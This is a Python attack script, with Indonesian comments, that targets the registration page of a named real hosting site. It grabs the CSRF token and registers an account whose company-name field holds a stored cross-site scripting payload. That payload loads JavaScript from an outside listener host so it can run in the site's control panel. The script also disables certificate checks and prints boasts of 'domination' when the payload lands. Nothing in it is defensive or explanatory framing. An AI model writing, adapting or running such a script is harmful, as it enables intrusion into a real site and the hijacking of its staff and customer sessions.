import requests
import re
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET_URL = "https://manage.edisglobal.com/register.php"
LISTENER_URL = "http://interceptor.astro.net/titans.js"

def exploit():
    session = requests.Session()
    print("[*] Tahap 1: Menarik CSRF Token dari Portal Utama...")
    
    try:
        r = session.get(TARGET_URL, verify=False, timeout=10)
        csrf_match = re.search(r'name="token" value="([a-f0-9]+)"', r.text)
        if not csrf_match:
            print("[-] Gagal menemukan CSRF Token.")
            return
        csrf_token = csrf_match.group(1)
        print(f"[+] CSRF Token Didapat: {csrf_token}")

        print("[*] Tahap 2: Menembakkan Titan Breaker Payload...")
        
        # Payload XSS yang disamarkan
        xss_payload = f'Astro Corp"><script src="{LISTENER_URL}"></script>'
        
        data = {
            "token": csrf_token,
            "firstname": "Astro",
            "lastname": "Titan",
            "email": "titan_dominasi_01@proton.me",
            "phonenumber": "6281234567890",
            "companyname": xss_payload,
            "address1": "God Sector 1",
            "city": "Baubau",
            "state": "Southeast Sulawesi",
            "postcode": "93711",
            "country": "ID",
            "customfield[35]": "Titan Protocol",
            "password": "DominasiMutlak123!",
            "password2": "DominasiMutlak123!",
            "accepttos": "on"
        }
        
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": TARGET_URL,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36"
        }
        
        res = session.post(TARGET_URL, data=data, headers=headers, verify=False, timeout=15)
        
        if res.status_code == 200:
            if "Registration Successful" in res.text or "clientarea.php" in res.url:
                print("\033[92m[!!!] DOMINASI BERHASIL: Payload Stored XSS telah tertanam di Pusat Kontrol.\033[0m")
            else:
                print("[-] Pendaftaran mungkin gagal atau memerlukan verifikasi email.")
                # print(res.text[:500])
        else:
            print(f"[-] Error: Status Code {res.status_code}")

    except Exception as e:
        print(f"[-] Kegagalan Sistem: {e}")

if __name__ == "__main__":
    exploit()
